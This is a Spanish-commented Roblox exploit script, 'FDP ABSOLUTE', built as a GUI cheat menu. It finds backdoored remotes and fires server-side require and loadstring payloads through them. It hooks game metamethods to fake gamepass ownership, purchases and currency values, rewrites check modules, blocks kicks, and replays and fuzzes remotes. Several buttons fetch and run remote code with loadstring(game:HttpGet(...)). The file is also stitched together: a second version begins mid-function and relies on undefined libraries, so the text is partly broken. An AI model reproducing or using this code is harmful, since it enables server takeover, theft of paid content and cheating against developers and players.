--[[ 
    FDP ABSOLUTE - NATIVE EDITION
    Status: OFFLINE COMPATIBLE (Zero External Libs)
    Features: SS Hunter, Lucky Patcher, Smart Repeater, Data Hook
]]

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- --- CONFIGURACIÓN VISUAL ---
local GUI_THEME = {
    Bg = Color3.fromRGB(20, 20, 20),
    Dark = Color3.fromRGB(15, 15, 15),
    Accent = Color3.fromRGB(170, 0, 255), -- Morado Hacker
    Text = Color3.fromRGB(255, 255, 255)
}

-- --- LIMPIEZA ---
if CoreGui:FindFirstChild("FDP_Native") then CoreGui.FDP_Native:Destroy() end

-- --- CREACIÓN GUI ---
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FDP_Native"
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 500, 0, 350)
Main.Position = UDim2.new(0.5, -250, 0.5, -175)
Main.BackgroundColor3 = GUI_THEME.Bg
Main.BorderSizePixel = 0
Main.Parent = ScreenGui

local UICorner = Instance.new("UICorner", Main)
UICorner.CornerRadius = UDim.new(0, 10)

-- HEADER
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 40)
Header.BackgroundColor3 = GUI_THEME.Dark
Header.Parent = Main
Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel")
Title.Text = "FDP ABSOLUTE [NATIVE]"
Title.Size = UDim2.new(1, -50, 1, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = GUI_THEME.Accent
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Parent = Header

local Close = Instance.new("TextButton")
Close.Text = "X"
Close.Size = UDim2.new(0, 40, 1, 0)
Close.Position = UDim2.new(1, -40, 0, 0)
Close.BackgroundTransparency = 1
Close.TextColor3 = Color3.fromRGB(255, 50, 50)
Close.Font = Enum.Font.GothamBold
Close.TextSize = 18
Close.Parent = Header
Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- TABS CONTAINER
local TabFrame = Instance.new("ScrollingFrame")
TabFrame.Size = UDim2.new(0, 120, 1, -50)
TabFrame.Position = UDim2.new(0, 10, 0, 45)
TabFrame.BackgroundColor3 = GUI_THEME.Dark
TabFrame.BorderSizePixel = 0
TabFrame.Parent = Main
Instance.new("UICorner", TabFrame).CornerRadius = UDim.new(0, 8)

local TabList = Instance.new("UIListLayout", TabFrame)
TabList.Padding = UDim.new(0, 5)
TabList.SortOrder = Enum.SortOrder.LayoutOrder

-- PAGES CONTAINER
local PageFrame = Instance.new("Frame")
PageFrame.Size = UDim2.new(1, -145, 1, -50)
PageFrame.Position = UDim2.new(0, 140, 0, 45)
PageFrame.BackgroundTransparency = 1
PageFrame.Parent = Main

-- --- FUNCIONES UI ---
local CurrentPage = nil

function CreateTab(Name)
    local Page = Instance.new("ScrollingFrame")
    Page.Name = Name
    Page.Size = UDim2.new(1, 0, 1, 0)
    Page.BackgroundTransparency = 1
    Page.Visible = false
    Page.ScrollBarThickness = 4
    Page.Parent = PageFrame
    
    local List = Instance.new("UIListLayout", Page)
    List.Padding = UDim.new(0, 8)
    
    local Btn = Instance.new("TextButton")
    Btn.Text = Name
    Btn.Size = UDim2.new(1, 0, 0, 35)
    Btn.BackgroundColor3 = GUI_THEME.Bg
    Btn.TextColor3 = GUI_THEME.Text
    Btn.Font = Enum.Font.Gotham
    Btn.TextSize = 12
    Btn.Parent = TabFrame
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
    
    Btn.MouseButton1Click:Connect(function()
        if CurrentPage then CurrentPage.Visible = false end
        CurrentPage = Page
        Page.Visible = true
    end)
    
    return Page
end

function CreateButton(Page, Text, Callback)
    local Btn = Instance.new("TextButton")
    Btn.Text = Text
    Btn.Size = UDim2.new(1, -10, 0, 40)
    Btn.BackgroundColor3 = GUI_THEME.Dark
    Btn.TextColor3 = GUI_THEME.Text
    Btn.Font = Enum.Font.GothamSemibold
    Btn.TextSize = 14
    Btn.Parent = Page
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
    Btn.MouseButton1Click:Connect(Callback)
end

function CreateToggle(Page, Text, Callback)
    local Enabled = false
    local Btn = Instance.new("TextButton")
    Btn.Text = Text .. " [OFF]"
    Btn.Size = UDim2.new(1, -10, 0, 40)
    Btn.BackgroundColor3 = GUI_THEME.Dark
    Btn.TextColor3 = Color3.fromRGB(150, 150, 150)
    Btn.Font = Enum.Font.GothamSemibold
    Btn.TextSize = 14
    Btn.Parent = Page
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
    
    Btn.MouseButton1Click:Connect(function()
        Enabled = not Enabled
        if Enabled then
            Btn.Text = Text .. " [ON]"
            Btn.TextColor3 = GUI_THEME.Accent
            Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        else
            Btn.Text = Text .. " [OFF]"
            Btn.TextColor3 = Color3.fromRGB(150, 150, 150)
            Btn.BackgroundColor3 = GUI_THEME.Dark
        end
        Callback(Enabled)
    end)
end

-- ============================================================================
-- PESTAÑA: SS HUNTER (DETECTOR BACKDOORS)
-- ============================================================================
local PageSS = CreateTab("SS Hunter")

local DetectedSS = nil

CreateButton(PageSS, "☢️ SCAN BACKDOORS (NEURAL)", function()
    local Targets = game:GetDescendants()
    if getnilinstances then for _,v in pairs(getnilinstances()) do table.insert(Targets, v) end end
    
    local Count = 0
    for _, v in pairs(Targets) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            if v.Name:lower():find("admin") or v.Name:lower():find("ss") or v.Name:lower():find("backdoor") then
                if not v.Parent:IsA("ReplicatedStorage") then -- Sospechoso
                    print("BACKDOOR FOUND: " .. v.GetFullName(v))
                    DetectedSS = v
                    Count = Count + 1
                end
            end
        end
    end
    if Count > 0 then
        Title.Text = "¡ALERTA: " .. Count .. " BACKDOORS!"
    else
        Title.Text = "Seguro: 0 Backdoors"
    end
end)

CreateButton(PageSS, "💉 INYECTAR EN ÚLTIMO ENCONTRADO", function()
    if DetectedSS then
        pcall(function()
            DetectedSS:FireServer(tonumber(4952280696)) -- IY ID
            DetectedSS:FireServer("require(4952280696).load('"..LocalPlayer.Name.."')")
        end)
    end
end)

-- ============================================================================
-- PESTAÑA: LUCKY PATCHER (ECONOMY)
-- ============================================================================
local PageEco = CreateTab("Economy")

CreateToggle(PageEco, "ACTIVATE LUCKY PATCHER", function(Val)
    if Val then
        local old
        old = hookmetamethod(game, "__namecall", function(self, ...)
            local m = getnamecallmethod()
            if not checkcaller() then
                if m == "UserOwnsGamePassAsync" then return true end
                if m == "PlayerOwnsAsset" then return true end
                if m == "UserHasBadgeAsync" then return true end
                if m == "GetProductInfo" then return {Name="Hacked", PriceInRobux=0, ProductId=0} end
            end
            return old(self, ...)
        end)
    end
end)

CreateToggle(PageEco, "SIMULAR COMPRA (FAKE RECEIPT)", function(Val)
    if Val then
        local Market = game:GetService("MarketplaceService")
        local old
        old = hookmetamethod(game, "__namecall", function(self, ...)
            local m = getnamecallmethod()
            local args = {...}
            if not checkcaller() and m:find("Purchase") then
                local id = args[1] or args[2]
                task.spawn(function()
                    pcall(function() Market.PromptGamePassPurchaseFinished:Fire(LocalPlayer, id, true) end)
                    pcall(function() Market.PromptProductPurchaseFinished:Fire(LocalPlayer, id, true) end)
                end)
                return nil
            end
            return old(self, ...)
        end)
    end
end)

-- ============================================================================
-- PESTAÑA: DATA HOOK (VALUES)
-- ============================================================================
local PageData = CreateTab("Data Hook")

CreateToggle(PageData, "HOOK VALUES (VIP/MONEY)", function(Val)
    if Val then
        local old
        old = hookmetamethod(game, "__index", function(self, key)
            if not checkcaller() and key == "Value" then
                local n = self.Name:lower()
                if self:IsA("BoolValue") and (n:find("vip") or n:find("pass")) then return true end
                if (self:IsA("IntValue") or self:IsA("NumberValue")) and (n:find("money") or n:find("cash")) then 
                    if old(self, key) < 100 then return 999999 end
                end
            end
            return old(self, key)
        end)
    end
end)

CreateButton(PageData, "💉 INFECTAR MÓDULOS (CHECKPASS)", function()
    for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if v:IsA("ModuleScript") and (v.Name:find("Check") or v.Name:find("Pass")) then
            local s, m = pcall(require, v)
            if s and type(m) == "table" then
                for k, f in pairs(m) do
                    if type(f) == "function" and hookfunction then
                        hookfunction(f, function() return true end)
                    end
                end
            end
        end
    end
end)

-- ============================================================================
-- PESTAÑA: UI & AUTOMATION
-- ============================================================================
local PageAuto = CreateTab("Auto & UI")

CreateButton(PageAuto, "👁️ FORZAR PANELES OCULTOS", function()
    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if v.Name:lower():find("admin") or v.Name:lower():find("vip") then
            if v:IsA("Frame") then v.Visible = true; v.Position = UDim2.new(0.5,0,0.5,0) end
            if getconnections then
                for _,c in pairs(getconnections(v:GetPropertyChangedSignal("Visible"))) do c:Disable() end
            end
        end
    end
end)

local Farming = false
CreateToggle(PageAuto, "AUTO-FARM (COIN/EGG)", function(Val)
    Farming = Val
    if Val then
        task.spawn(function()
            while Farming do
                pcall(function()
                    for _, v in pairs(workspace:GetDescendants()) do
                        if (v.Name:find("Coin") or v.Name:find("Egg")) and v:IsA("BasePart") then
                            LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
                            task.wait(0.2)
                        end
                    end
                end)
                task.wait(1)
            end
        end)
    end
end)

-- ============================================================================
-- PESTAÑA: TOOLS
-- ============================================================================
local PageTools = CreateTab("Tools")

CreateButton(PageTools, "📂 Dex Explorer", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))() end)
CreateButton(PageTools, "🐢 Turtle Spy", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))() end)
CreateButton(PageTools, "♾️ Infinite Yield", function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end)

-- DRAGGABLE
local dragging, dragInput, dragStart, startPos
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = input.Position; startPos = Main.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
Main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- PÁGINA INICIAL
CurrentPage = PageSS
PageSS.Visible = true    local notes = ""
    local name = obj.Name:lower()
    local parent = obj.Parent and obj.Parent.Name:lower() or "nil"

    -- 1. Análisis de Nombre
    for _, sig in pairs(Signatures) do
        if name:find(sig:lower()) then 
            score = score + 40 
            notes = notes .. "[Nombre Sospechoso] "
            break
        end
    end

    -- 2. Análisis de Ubicación (Los backdoors se esconden en lugares raros)
    if obj.Parent == game:GetService("JointsService") or 
       obj.Parent == game:GetService("Lighting") or 
       obj.Parent == game:GetService("SoundService") or
       obj.Parent == game:GetService("MaterialService") then
        score = score + 35
        notes = notes .. "[Ubicación Rara] "
    end

    -- 3. Análisis de Nil (Oculto en memoria)
    if not obj.Parent then
        score = score + 50
        notes = notes .. "[OCULTO/NIL] "
    end

    -- 4. Análisis de Estructura (Nombres confusos)
    if name:find("ilil") or name:find("wc") or name == "" or name == " " then
        score = score + 20
        notes = notes .. "[Nombre Obfuscado] "
    end

    return score, notes
end

Tabs.Backdoor:AddButton({
    Title = "☢️ INICIAR ESCANEO NEURONAL (DEEP SCAN)",
    Description = "Analiza Workspace, Nil Instances y Servicios Ocultos.",
    Callback = function()
        ScannedRemotes = {}
        local DropList = {}
        local Count = 0
        
        Notify("Escaneando...", "Analizando heurística profunda...")
        
        -- Recolector de Objetos (Incluyendo ocultos si el ejecutor lo permite)
        local Targets = game:GetDescendants()
        if getnilinstances then
            local nils = getnilinstances()
            for _, v in pairs(nils) do table.insert(Targets, v) end
            Notify("Elite Feature", "Escaneando memoria oculta (Nil Instances).")
        end

        for _, obj in pairs(Targets) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local Score, Notes = CalculateThreat(obj)
                
                -- Solo mostramos si tiene un riesgo mínimo o si el usuario quiere ver todo
                if Score >= 20 then
                    Count = Count + 1
                    local ID = string.format("[%d%%] %s (%s)", Score, obj.Name, obj.Parent and obj.Parent.Name or "Nil")
                    ScannedRemotes[ID] = obj
                    table.insert(DropList, ID)
                end
            end
        end
        
        if Count > 0 then
            Notify("ALERTA", "Se encontraron " .. Count .. " posibles backdoors.")
            Options.SSList:SetValues(DropList)
            Options.SSList:SetValue(nil)
        else
            Notify("Seguro", "No se detectaron firmas de backdoors conocidos.")
            Options.SSList:SetValues({"Ninguno"})
        end
    end
})

local SSDrop = Tabs.Backdoor:AddDropdown("SSList", {
    Title = "Resultados del Escáner",
    Values = {"Haz un scan primero"},
    Multi = false,
    Default = nil,
})

SSDrop:OnChanged(function(Value)
    if ScannedRemotes[Value] then
        SelectedSS = ScannedRemotes[Value]
        Notify("Objetivo Fijado", "Seleccionado: " .. SelectedSS.Name)
    end
end)

Tabs.Backdoor:AddSection("Ejecución de Payload (Hack)")

Tabs.Backdoor:AddButton({
    Title = "💉 INYECTAR 'REQUIRE' (Module Loader)",
    Description = "El método más común. Intenta cargar un script de admin externo.",
    Callback = function()
        if not SelectedSS then Notify("Error", "Selecciona un backdoor."); return end
        pcall(function()
            -- Probamos varios IDs de scripts maliciosos conocidos
            SelectedSS:FireServer(tonumber(4952280696)) -- Infinite Yield SS
            SelectedSS:FireServer("require(4952280696).load('"..game.Players.LocalPlayer.Name.."')")
        end)
        Notify("Enviado", "Payload de carga enviado.")
    end
})

Tabs.Backdoor:AddButton({
    Title = "📜 INYECTAR CÓDIGO (Loadstring)",
    Description = "Si el backdoor permite código directo (muy raro/peligroso).",
    Callback = function()
        if not SelectedSS then Notify("Error", "Selecciona un backdoor."); return end
        local Script = [[
            local m = Instance.new("Message", workspace)
            m.Text = "FDP CLIENT: SERVER OWNED"
            wait(5)
            m:Destroy()
            require(4952280696).load("]]..game.Players.LocalPlayer.Name..[[")
        ]]
        pcall(function() SelectedSS:FireServer(Script) end)
        Notify("Enviado", "Payload de código enviado.")
    end
})

-- ============================================================================
-- PESTAÑA 3: ECONOMY (LUCKY PATCHER SUPREMO)
-- ============================================================================
local LP_Prop = false
local LP_Buy = false
local LP_Mock = false
local SniffingID = false

Tabs.Economy:AddSection("Intercepción & Robo")
Tabs.Economy:AddToggle("SniffToggle", {Title="ID SNIFFER", Default=false, Callback=function(Val) SniffingID=Val; if Val then 
    local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and SniffingID and getnamecallmethod():find("Purchase") then local a={...}; for _,v in pairs(a) do if type(v)=="number" and v>100 then Notify("ID DETECTADO", tostring(v)); if Options.CrackID then Options.CrackID:SetValue(tostring(v)) end end end return nil end return old(s,...) end) 
end end})

Tabs.Economy:AddSection("Emulación")
Tabs.Economy:AddToggle("LPToggle", {Title="EMULACIÓN DE PROPIEDAD", Default=false, Callback=function(Val) LP_Prop=Val; if Val then local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and LP_Prop then local m=getnamecallmethod(); if m=="UserOwnsGamePassAsync" or m=="PlayerOwnsAsset" or m=="IsPlayerIdInGroup" then return true end end return old(s,...) end) end end})
Tabs.Economy:AddToggle("BuyToggle", {Title="SIMULADOR DE COMPRA", Default=false, Callback=function(Val) LP_Buy=Val; if Val then local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and LP_Buy and getnamecallmethod():find("Purchase") then Notify("HACK", "Simulando compra..."); task.spawn(function() game:GetService("MarketplaceService").PromptGamePassPurchaseFinished:Fire(game.Players.LocalPlayer, ({...})[1], true) end); return nil end return old(s,...) end) end end})
Tabs.Economy:AddToggle("MockToggle", {Title="ANTI-ERROR (MOCK)", Default=true, Callback=function(Val) LP_Mock=Val; if Val then local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and LP_Mock and getnamecallmethod()=="GetProductInfo" then return {Name="Cracked", PriceInRobux=0, ProductId=0, IsForSale=true} end return old(s,...) end) end end})

Tabs.Economy:AddSection("Manual")
Tabs.Economy:AddInput("CrackID", {Title="ID Objetivo", Default=""})
Tabs.Economy:AddButton({Title="💉 INYECTAR COMPRA", Callback=function()
    local ID = tonumber(Options.CrackID.Value)
    if ID and getconnections then 
        local M = game:GetService("MarketplaceService")
        for _,c in pairs(getconnections(M.PromptGamePassPurchaseFinished)) do c:Fire(game.Players.LocalPlayer, ID, true) end
        for _,c in pairs(getconnections(M.PromptProductPurchaseFinished)) do c:Fire(game.Players.LocalPlayer, ID, true) end
        Notify("OK", "Inyectado.")
    else Notify("Error", "Falta ID o soporte.") end
end})

-- ============================================================================
-- PESTAÑA 4: REMOTE WARFARE
-- ============================================================================
local SniffRemote = false; local CaughtR = nil; local CaughtA = {}
if hookmetamethod then local Old; Old=hookmetamethod(game,"__namecall",function(s,...) if SniffRemote and (getnamecallmethod()=="FireServer" or getnamecallmethod()=="InvokeServer") and not tostring(s):find("Character") then CaughtR=s; CaughtA={...}; SniffRemote=false; Notify("CAPTURED", s.Name) end return Old(s,...) end) end

Tabs.Remote:AddButton({Title="📡 DETECTAR", Callback=function() SniffRemote=true; Notify("...", "Acción") end})
Tabs.Remote:AddButton({Title="⬇️ CARGAR", Callback=function() if CaughtR then Options.RepPath:SetValue(CaughtR:GetFullName()) end end})
Tabs.Remote:AddInput("RepPath", {Title="Ruta", Default=""})
Tabs.Remote:AddInput("RepArgs", {Title="Argumentos (Opcional)", Default=""})
Tabs.Remote:AddButton({Title="🔥 START REPEATER", Callback=function() 
    local R = loadstring("return "..Options.RepPath.Value)()
    if R then 
        task.spawn(function() 
            while true do 
                pcall(function() if R:IsA("RemoteEvent") then R:FireServer(unpack(CaughtA)) else R:InvokeServer(unpack(CaughtA)) end end)
                task.wait(0.1)
            end 
        end)
        Notify("Loop", "Iniciado")
    end
end})

Tabs.Remote:AddButton({Title="🧠 LOGIC FUZZER", Callback=function()
    local R = loadstring("return "..Options.RepPath.Value)()
    if R then
        local P = {{-1}, {0/0}, {math.huge}, {-math.huge}}
        for _, v in pairs(P) do pcall(function() R:FireServer(unpack(v)) end); task.wait(0.1) end
        Notify("Fuzzer", "Enviado")
    end
end})

-- ============================================================================
-- PESTAÑA 5: DATA & UI
-- ============================================================================
local DataHook=false
Tabs.DataUI:AddToggle("DataHook", {Title="VALUE SPOOF", Default=false, Callback=function(V) DataHook=V; if V then local old; old=hookmetamethod(game,"__index",function(s,k) if not checkcaller() and DataHook and k=="Value" then if s.Name:lower():find("vip") then return true end if s.Name:lower():find("money") and old(s,k)<100 then return 999999 end end return old(s,k) end) end end})

Tabs.DataUI:AddButton({Title="💉 INFECTAR MÓDULOS", Callback=function()
    for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if v:IsA("ModuleScript") and (v.Name:find("Shop") or v.Name:find("Check")) then
            local s,m = pcall(require, v)
            if s and type(m)=="table" then for k,f in pairs(m) do if type(f)=="function" and hookfunction then hookfunction(f, function() return true end) end end end
        end
    end
    Notify("Infectado", "Módulos reescritos.")
end})

local SearchUI=""
Tabs.DataUI:AddInput("UIFind", {Title="Buscar Panel", Callback=function(v) SearchUI=v:lower() end})
Tabs.DataUI:AddButton({Title="👁️ FORCE UI + KILL CONN", Callback=function()
    for _,v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
        if v.Name:lower():find(SearchUI) then
            if v:IsA("ScreenGui") then v.Enabled=true end
            if v:IsA("Frame") then v.Visible=true; v.Position=UDim2.new(0.5,-100,0.5,-100) end
            if getconnections then for _,c in pairs(getconnections(v:GetPropertyChangedSignal("Visible"))) do c:Disable() end end
        end
    end
    Notify("UI", "Forzado.")
end})

-- ============================================================================
-- PESTAÑA 6: AUTOMATION, ENG & PLAYER
-- ============================================================================
local Farm=false; local FarmN=""
Tabs.Auto:AddInput("FarmT", {Title="Farm Name", Callback=function(v) FarmN=v end})
Tabs.Auto:AddToggle("FarmGo", {Title="AUTO-FARM", Callback=function(V) Farm=V; if V then task.spawn(function() while Farm do pcall(function() for _,v in pairs(workspace:GetDescendants()) do if v.Name==FarmN and v:IsA("BasePart") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=v.CFrame; task.wait(0.2) end end end) task.wait(1) end end) end end})

Tabs.Eng:AddButton({Title="🐢 TurtleSpy", Callback=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))() end})
Tabs.Eng:AddButton({Title="📂 Dark Dex V3", Callback=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))() end})
Tabs.Eng:AddButton({Title="☢️ Hydroxide", Callback=function() local owner="Upbolt";local branch="revision";local function webImport(file)return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner,branch,file)),file..'.lua')()end;webImport("init");webImport("ui/main") end})

Tabs.Player:AddSlider("WS", {Title="Speed", Default=16, Min=16, Max=300, Callback=function(v) if game.Players.LocalPlayer.Character then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=v end end})
Tabs.Player:AddButton({Title="✈️ Fly V3", Callback=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))() end})
Tabs.Player:AddButton({Title="🛡️ Anti-Kick", Callback=function() local old; old=hookmetamethod(game,"__namecall",function(s,...) if getnamecallmethod():lower()=="kick" then return nil end return old(s,...) end); Notify("OK","Anti-Kick") end})
Tabs.Player:AddButton({Title="👑 Infinite Yield", Callback=function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end})

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
Window:SelectTab(1)
Notify("FDP ABSOLUTE", "SISTEMA COMPLETO INICIADO.")
